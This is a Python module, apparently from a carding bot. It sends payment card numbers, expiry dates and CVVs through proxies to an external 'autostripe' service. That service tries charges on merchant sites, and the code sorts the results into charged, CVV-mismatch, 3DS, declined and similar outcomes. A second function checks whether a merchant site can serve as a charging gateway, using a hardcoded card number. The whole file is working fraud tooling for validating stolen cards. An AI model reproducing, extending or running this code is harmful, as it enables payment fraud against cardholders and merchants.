import json
import httpx
import asyncio
from proxy import get_proxy

AUTOSTRIPE_BASE_URL = "https://blackxcard-autostripe.onrender.com"
AUTOSTRIPE_KEY = "Blackxcard"

def get_site(user_id):
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        return sites.get(str(user_id), {}).get("site")
    except FileNotFoundError:
        return None
    except Exception:
        return None

def get_user_site_info(user_id):
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        return sites.get(str(user_id))
    except FileNotFoundError:
        return None
    except Exception:
        return None

async def check_card_autostripe(user_id, cc, site=None):
    """
    Check card using Autostripe API
    Endpoint format: https://blackxcard-autostripe.onrender.com/gateway=autostripe/key=Blackxcard/site={site}/cc={cc}
    """
    if not site:
        site = get_site(user_id)
    if not site:
        return "Site Not Found"

    # Build the URL
    # Format: /gateway=autostripe/key=Blackxcard/site=dilaboards.com/cc=4403934091847371|06|2026|097
    url = f"{AUTOSTRIPE_BASE_URL}/gateway=autostripe/key={AUTOSTRIPE_KEY}/site={site}/cc={cc}"

    proxy = get_proxy(user_id)
    
    retries = 0
    max_retries = 3
    
    while retries < max_retries:
        try:
            if proxy:
                transport = httpx.AsyncHTTPTransport(proxy=proxy)
                async with httpx.AsyncClient(transport=transport, timeout=120.0) as client:
                    response = await client.get(url)
            else:
                async with httpx.AsyncClient(timeout=120.0) as client:
                    response = await client.get(url)
            
            # Try to parse as JSON first
            try:
                data = response.json()
                response_text = data.get("Response", data.get("response", str(data))).upper()
            except:
                # If not JSON, use text response
                response_text = response.text.upper()
                data = {"Response": response.text}

            # Check for retry-able errors
            if any(err in response_text for err in [
                "SERVER DISCONNECTED",
                "PEER CLOSED CONNECTION",
                "CONNECTION ERROR",
                "TIMEOUT"
            ]):
                retries += 1
                await asyncio.sleep(1)
                continue
            
            break

        except httpx.ReadTimeout:
            retries += 1
            if retries >= max_retries:
                return "Request Timeout"
            await asyncio.sleep(1)
            continue
        except Exception as e:
            retries += 1
            if retries >= max_retries:
                return f"Connection Failed: {str(e)[:50]}"
            await asyncio.sleep(1)
            continue

    if retries == max_retries:
        return "Connection Failed"

    # Parse the response
    response_text = str(data.get("Response", data.get("response", data))).upper()
    
    # Determine result based on response
    if any(success in response_text for success in ["CHARGED", "ORDER_PLACED", "THANK YOU", "SUCCESS", "APPROVED"]):
        if "3DS" in response_text or "3D" in response_text:
            return "3DS_REQUIRED"
        return "CHARGED"
    elif any(cvv_err in response_text for cvv_err in ["INVALID_CVC", "INCORRECT_CVC", "CVC_CHECK_FAILED"]):
        return "CCN"
    elif "3DS_REQUIRED" in response_text or "3D_SECURE" in response_text:
        return "3DS_REQUIRED"
    elif "INSUFFICIENT_FUNDS" in response_text:
        return "INSUFFICIENT_FUNDS"
    elif any(declined in response_text for declined in ["DECLINED", "CARD_DECLINED", "DO_NOT_HONOR"]):
        return "DECLINED"
    elif "EXPIRED" in response_text:
        return "EXPIRED_CARD"
    elif "INVALID" in response_text:
        return "INVALID_CARD"
    elif "RATE_LIMIT" in response_text or "RATE LIMIT" in response_text:
        return "Rate Limited"
    else:
        # Return cleaned response
        clean_response = response_text[:100] if len(response_text) > 100 else response_text
        return clean_response if clean_response else "Unknown Response"


async def test_site_autostripe(site: str, test_cc: str = "4403934091847371|06|2026|097"):
    """
    Test if a site is valid for autostripe
    Returns dict with site info if valid, None otherwise
    """
    url = f"{AUTOSTRIPE_BASE_URL}/gateway=autostripe/key={AUTOSTRIPE_KEY}/site={site}/cc={test_cc}"
    
    try:
        async with httpx.AsyncClient(timeout=60.0) as client:
            response = await client.get(url)
            
            # Try to parse response
            try:
                data = response.json()
            except:
                data = {"Response": response.text}
            
            response_text = str(data.get("Response", data.get("response", ""))).upper()
            
            # Check if we got a valid response (not an error about site)
            if any(err in response_text for err in ["SITE NOT FOUND", "INVALID SITE", "SITE ERROR"]):
                return None
            
            # If we get any card-related response, the site is valid
            return {
                "site": site,
                "gate": "Autostripe",
                "status": "Active"
            }
            
    except Exception as e:
        print(f"Error testing site {site}: {e}")
        return None
